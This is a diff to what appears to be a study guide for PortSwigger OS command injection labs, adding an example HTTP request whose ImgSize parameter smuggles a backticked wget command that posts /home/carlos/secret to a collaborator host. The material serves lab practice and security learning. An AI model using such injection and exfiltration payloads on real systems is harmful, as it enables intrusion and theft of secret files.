@@ -4751,7 +4751,11 @@ Where the `whoami` output is the subdomain of the collaborator server.
 ```
 GET /image?filename=output.txt HTTP/2
 ```  
-  
+
+```
+GET /admin_panel/adminimage?imageFileName=/ruta/imagen/66.jpg&ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator`"
+```
+
 [PortSwigger Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)  
 
 -----
